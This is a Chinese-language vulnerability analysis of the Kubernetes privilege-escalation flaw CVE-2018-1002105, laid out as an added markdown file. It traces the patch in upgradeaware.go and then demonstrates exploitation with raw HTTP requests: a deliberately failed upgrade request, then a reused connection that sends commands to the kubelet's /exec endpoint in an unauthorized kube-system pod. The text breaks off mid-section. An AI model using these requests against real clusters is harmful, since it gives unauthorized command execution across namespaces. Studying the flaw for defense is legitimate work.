@@ -1,0 +1,187 @@
+# 1 漏洞描述
+Kubernetes特权升级漏洞（CVE-2018-1002105）由Rancher Labs联合创始人及首席架构师Darren
+Shepherd发现（漏洞发现的故事也比较有趣，是由定位问题最终发现的该漏洞）。该漏洞通过经过详细分析评估，主要可以实现提升k8s普通用户到k8s api
+server的权限（默认就是最高权限），但是值的注意点是，这边普通用户至少需要具有一个pod的exec/attach/portforward等权限。  
+# 2 影响范围
+Kubernetes v1.0.x-1.9.x  
+Kubernetes v1.10.0-1.10.10 (fixed in v1.10.11)  
+Kubernetes v1.11.0-1.11.4 (fixed in v1.11.5)  
+Kubernetes v1.12.0-1.12.2 (fixed in v1.12.3)
+# 3 漏洞来源
+# 4 漏洞修复代码定位
+## 4.1 常见的修复代码定位手段
+一般我们可以通过两种方式快速定位到一个最新CVE漏洞的修复代码，只有找到修复代码，我们才可以快速反推出整个漏洞细节以及漏洞利用方式等。
+方法一，通过git log找到漏洞修复代码，例如
+    git clone https://github.com/kubernetes/kubernetes/
+    cd ./kubernetes
+    git log -p
+由于本次漏洞针对该CVE单独出了一个补丁版本，所以方法二可能定位修复代码更快速，我们是通过方法二快速定位到漏洞代码。
+方法二，通过对最老的fix版本，进行代码比对，快速定位漏洞修复代码
+## 4.2 定位CVE-2018-1002105修复代码
+如上图所示，我们下载了1.10.10和1.10.11的代码，通过文件比对，发现只有一个核心文件被修改了即：
+    staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go
+综上，我们可以确认，本次漏洞是在upgradeaware.go中进行了修复，修复的主要内容是  
+增加了获取ResponseCode的方法
+    // getResponseCode reads a http response from the given reader, returns the status code,
+    // the bytes read from the reader, and any error encountered
+    func getResponseCode(r io.Reader) (int, []byte, error) {
+        rawResponse := bytes.NewBuffer(make([]byte, 0, 256))
+        // Save the bytes read while reading the response headers into the rawResponse buffer
+        resp, err := http.ReadResponse(bufio.NewReader(io.TeeReader(r, rawResponse)), nil)
+        if err != nil {
+            return 0, nil, err
+        }
+        // return the http status code and the raw bytes consumed from the reader in the process
+        return resp.StatusCode, rawResponse.Bytes(), nil
+    }
+利用该方法获取了Response
+    // determine the http response code from the backend by reading from rawResponse+backendConn
+    rawResponseCode, headerBytes, err := getResponseCode(io.MultiReader(bytes.NewReader(rawResponse), backendConn))
+    if err != nil {
+        glog.V(6).Infof("Proxy connection error: %v", err)
+        h.Responder.Error(w, req, err)
+        return true
+    }
+    if len(headerBytes) > len(rawResponse) {
+        // we read beyond the bytes stored in rawResponse, update rawResponse to the full set of bytes read from the backend
+        rawResponse = headerBytes
+    }
+并在一步关键判断中限制了获取到的Response必须等于http.StatusSwitchingProtocols（这个在go的http中有定义，StatusSwitchingProtocols
+= 101 // RFC 7231, 6.2.2），否则就return true。即本次修复最核心的逻辑是增加了逻辑判断，限定Response
+Code必须等于101，如果不等于101则return true，后面我们将详细分析这其中的逻辑，来最终倒推出漏洞。
+    if rawResponseCode != http.StatusSwitchingProtocols {
+        // If the backend did not upgrade the request, finish echoing the response from the backend to the client and return, closing the connection.
+        glog.V(6).Infof("Proxy upgrade error, status code %d", rawResponseCode)
+        _, err := io.Copy(requestHijackedConn, backendConn)
+        if err != nil && !strings.Contains(err.Error(), "use of closed network connection") {
+            glog.Errorf("Error proxying data from backend to client: %v", err)
+        }
+        // Indicate we handled the request
+        return true
+    }
+附上此次commit记录
+    https://github.com/kubernetes/kubernetes/commit/0535bcef95a33855f0a722c8cd822c663fc6275e
+# 5 漏洞分析
+## 5.1 漏洞原理分析
+下图为本次漏洞修复的最核心逻辑，分析这段代码的内在含义，可以帮助我们去理解漏洞是如何产生的。  
+代码位置： staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go  
+在分析漏洞修复逻辑之前，我们需要先看下上图代码中两个Goroutine有什么作用，通过代码注释或者跟读都不难看出这边主要是在建立一个proxy通道。
+对比修复前后的代码处理流程，可以发现
+修复后：
+需要先获取本次请求的rawResponseCode，且判断rawResponseCode不等于101时，return
+true，即无法走建立proxy通道。如果rawResponseCode等于101，则可以走到下面两个Goroutine，成功建立proxy通道。
+修复前：
+由于没有对返回码的判断，所以无论实际rawResponseCode会返回多少，都会成功走到这两个Goroutine中，建立起proxy通道。
+综合上述分析结果，不难看出本次修复主要是为了限制rawResponseCode不等于101则不允许建立proxy通道，为什么这么修复呢？
+仔细分析相关代码我们可以看出当请求正常进行协议切换时，是会返回一个101的返回码，继而建立起一个websocket通道，该websocket通道是建立在原有tcp通道之上的，且在该TCP的生命周期内，其只能用于该websocket通道，所以这是安全的。  
+而当一个协议切换的请求转发到了Kubelet上处理出错时，上述api
+server的代码中未判断该错误就继续保留了这个TCP通道，导致这个通道可以被TCP连接复用，此时就由api
+server打通了一个client到kubelet的通道，且此通道实际操作kubelet的权限为api server的权限。
+附：  
+为了更好的理解，我们可以了解下API Server和Kubelet的基础概念。  
+(1) k8s API Server  
+API Server是整个系统的数据总线和数据中心，它最主要的功能是提供REST接口进行资源对象的增删改查，另外还有一类特殊的REST接口—k8s
+Proxy API接口，这类接口的作用是代理REST请求，即kubernetes API
+Server把收到的REST请求转发到某个Node上的kubelet守护进程的REST端口上，由该kubelet进程负责响应。  
+(2) Kubelet  
+Kubelet服务进程在Kubenetes集群中的每个Node节点都会启动，用于处理Master下发到该节点的任务，管理Pod及其中的容器，同时也会向API
+Server注册相关信息，定期向Master节点汇报Node资源情况。
+# 5.2 漏洞利用分析
+所以现在我们需要构造一个可以转发到Kubelet上并处理出错的协议切换请求，这里包含以下三点
+## 5.2.1 如何通过API server将请求发送到Kubelet
+代码路径：pkg/kubelet/server/server.go  
+通过跟踪Kubelet的server代码，可以发现Kubelet
+server的InstallDebuggingHandlers方法中注册了exec、attach、portForward等接口，同时Kubelet的内部接口通过api
+server对外提供服务，所以对API server的这些接口调用，可以直接访问到Kubelet（client -->> API server -->
+Kubelet）。
+## 5.2.2 如何构造协议切换
+代码位置：staging/src/k8s.io/apimachinery/pkg/util/httpstream/httpstream.go  
+很明显，在IsUpgradeRequest方法进行了请求过滤，满足HTTP请求头中包含 Connection和Upgrade 要求的将返回True。  
+IsUpgradeRequest返回False的则直接退出tryUpdate函数，而返回True的则继续运行，满足协议协议切换的条件。所以我们只需发送给API
+Server的攻击请求HTTP头中携带Connection/Upgrade Header即可。
+## 5.2.3 如何构造失败
+代码位置：pkg/kubelet/server/remotecommand/httpstream.go  
+上图代码中可以看出如果对exec接口的请求参数中不包含stdin、stdout、stderr三个，则可以构造一个错误。  
+至此，漏洞产生的原理以及漏洞利用的方式已经基本分析完成。
+# 6 漏洞攻击利用思路
+## 6.1 HTTP与HTTPS下的API SERVER
+针对此次漏洞，需要说明下，分为两种情况
+第一种情况，K8S未开启HTTPS，这种情况下，api server是不鉴权的，直接就可以获取api
+server的最高权限，无需利用本次的漏洞，故不在本次分析范围之内。
+第二种情况，K8S开启了HTTPS，使用了权限控制（默认有多种认证鉴权方式，例如证书双向校验、Bearer Token
+模式等），这种情况下K8S默认是支持匿名用户的，即匿名用户可以完成认证，但默认匿名用户会被分配到 system:anonymous 用户名和
+system:unauthenticated
+组，该组默认权限非常低，只能访问一些公开的接口，例如
+## 6.2 K8S开启认证授权下的利用分析
+下面我们梳理下，在K8S已经开启认证授权下，该漏洞是如何利用的。  
+# 7 漏洞利用演示
+## 7.1 满足先决条件
+先看下正常请求执行的链路是怎么样的：client --> apiserver --> kubelet  
+即client首先对apiserver发起请求，例如发送请求 [连接某一个容器并执行exec]
+，请求首先会被发到apiserver，apiserver收到请求后首先对该请求进行认证校验，如果此时使用的是匿名用户（无任何认证信息），正如上面代码层的分析结果，api
+server上是可以通过认证的，但会授权失败，即client只能走到apiserver而到不了kubelet就被返回403并断开连接了。  
+所以本次攻击的先决条件是，我们需要有一个可以从client到apiserver到kubelet整个链路通信认证通过的用户。  
+所以在本次分析演示中，我们创建了一个普通权限的用户，该用户只具有role
+namespace（新创建的）内的权限，包括对该namespace内pods的exec权限等，对其他namespace无权限。并启用了Bearer
+Token 认证模式（认证方式为在请求头加上Authorization: Bearer 1234567890 即可）。
+## 7.2 构造第一次请求
+攻击点先决条件满足后，我们需要构造第一个攻击报文，即满足API server
+往后端转发（通过HTTP头检测），且后端kubelet会返回失败。先构造一个可以往后端转发的请求，构造消息如下
+    192.168.127.80:6443
+    GET /api/v1/namespaces/role/pods/test1/exec?command=bash&stderr=true&stdin=true&stdout=true&tty=true HTTP/1.1
+    Host: 192.168.127.80:6443
+    Authorization: Bearer 1234567890
+    Connection: upgrade
+    Upgrade: websocket
+但是这个消息还不满足我们的要求，因为这个消息到kubelet后可以被成功处理并返回101，然后成功建立一个到我们有权限访问的role下的test容器的wss控制连接，这并不是我们所期待的，我们期待的是获取K8S最高权限，可以连接任意容器，执行任意操作等。  
+所以我们要改造这个请求，来构造出一个错误的返回，利用错误返回没有被处理导致连接可以继续保持的特性来复用通道打成后面的目的。改造请求如下
+    192.168.127.80:6443
+    GET /api/v1/namespaces/role/pods/test1/exec HTTP/1.1
+    Host: 192.168.127.80:6443
+    Authorization: Bearer 1234567890
+    Connection: upgrade
+    Upgrade: websocket
+该请求返回结果为
+    HTTP/1.1 400 Bad Request
+    Date: Fri, 07 Dec 2018 08:28:34 GMT
+    Content-Length: 52
+    Content-Type: text/plain; charset=utf-8
+    you must specify at least 1 of stdin, stdout, stderr
+为什么这么构造，可以产生失败呢？因为exec接口的调用至少要指定标准输入、标准输出或错误输出中的任意一个（正如前面代码分析中所述），所以我们没有对exec接口进行传参即可完成构造。
+## 7.3 构造第二次请求
+因为上面错误返回后，API
+SERVER没有处理，所以此时我们已经打通了到kubelet的连接，接下来我们就可以利用这个通道来建立与其它pod的exec连接。但是此时如果对kubelet不熟悉的同学在继续攻击是可能会犯这样的错误，例如这样去构造了第二次的攻击报文
+    GET /api/v1/namespaces/kube-system/pods/kube-flannel-ds-amd64-v2kgb/exec?command=/bin/hostname&input=1&output=1&tty=0 HTTP/1.1
+    Upgrade: websocket
+    Connection: Upgrade
+    Host: 192.168.127.80:6443
+    Origin: http://192.168.127.80:6443
+    Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
+    Sec-WebSocket-Version: 13
+如果这样发送第二个请求来获取其它无权限pod的exec权限时，返回的结果会是如下所示，且通道继续保留
+    HTTP/1.1 404 Not Found
+    Content-Type: text/plain; charset=utf-8
+    X-Content-Type-Options: nosniff
+    Date: Fri, 07 Dec 2018 13:14:50 GMT
+    Content-Length: 19
+    404 page not found
+这是因为当前的通道我们的消息是会直接被转发到kubelet上，而不需要对API
+server发送exec让他来进行api请求解析处理，所以我们的请求地址不应该是/api/v1/namespaces/kube-system/pods/kube-flannel-ds-amd64-v2kgb/exec而应该是如下所示，直接调用kubelet的内部接口即可，如下所示
+    GET /exec/kube-system/kube-flannel-ds-amd64-v2kgb/kube-flannel?command=/bin/hostname&input=1&output=1&tty=0 HTTP/1.1
+    Upgrade: websocket
+    Connection: Upgrade
+    Host: 192.168.127.80:6443
+    Origin: http://192.168.127.80:6443
+    Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
+    Sec-WebSocket-Version: 13
+说明下，这个接口中路径的入参是这样的：/exec/{namespace}/{pod}/{container}?command=...  
+该请求即可获取到我们所期待的结果，如下所示，成功获取到了对其他无权限容器命令执行的结果
+    HTTP/1.1 101 Switching Protocols
+    Upgrade: websocket
+    Connection: Upgrade
+    Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
+    Sec-WebSocket-Protocol: v4.channel.k8s.io
+    pegasus03#{"metadata":{},"status":"Success"}
+## 7.4 如何获取其它POD信息
+在发送第二个报文并完成漏洞攻击的过程中，我们演示攻击了kube-system namespace下的kube-flannel-ds-amd64-v2kgb
+pod，那么真实攻击环境下，我们如何获取到其它namespace与pods等信息呢？  
